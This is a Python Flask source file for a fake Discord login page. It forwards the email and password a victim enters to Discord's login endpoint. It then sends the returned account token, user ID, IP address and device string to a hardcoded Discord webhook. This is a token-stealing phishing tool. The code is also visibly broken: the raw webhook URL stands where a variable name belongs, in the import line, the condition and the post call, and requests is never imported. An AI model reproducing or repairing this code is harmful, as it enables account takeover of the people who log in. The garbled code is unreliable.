from flask import Flask, request, jsonify, render_template
from config.settings import https://discord.com/api/webhooks/1482859214895579258/x10n-msqCo7M31DlpZn04j9z9-PTT3zQsdR_ML2IFqTDH6_M4DZUP1xqczTpNEXctcpP

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    data = request.json
    email = data.get('email')
    password = data.get('password')
    
    # Simulate Discord API login
    response = requests.post(
        'https://discord.com/api/v9/auth/login',
        headers={'Content-Type': 'application/json'},
        json={'email': email, 'password': password}
    )
    
    if response.status_code == 200:
        token = response.json().get('token')
        user_id = response.json().get('user').get('id')
        
        # Get client info
        client_info = {
            'ip': request.remote_addr,
            'location': 'N/A',
            'device': request.headers.get('User-Agent'),
            'network': 'N/A'
        }
        
        # Send to Discord webhook
        if https://discord.com/api/webhooks/1482859214895579258/x10n-msqCo7M31DlpZn04j9z9-PTT3zQsdR_ML2IFqTDH6_M4DZUP1xqczTpNEXctcpP:
            payload = {
                "content": f"Login detected:\nToken: {token}\nID: {user_id}",
                "embeds": [{
                    "title": "Client Info",
                    "fields": [
                        {"name": "IP", "value": client_info['ip']},
                        {"name": "Location", "value": client_info['location']},
                        {"name": "Device", "value": client_info['device']},
                        {"name": "Network", "value": client_info['network']}
                    ]
                }]
            }
            requests.post(https://discord.com/api/webhooks/1482859214895579258/x10n-msqCo7M31DlpZn04j9z9-PTT3zQsdR_ML2IFqTDH6_M4DZUP1xqczTpNEXctcpP, json=payload)
        
        return jsonify({"token": token, "user_id": user_id})
    return jsonify({"error": "Invalid credentials"}), 401

if __name__ == '__main__':
    app.run(debug=True)
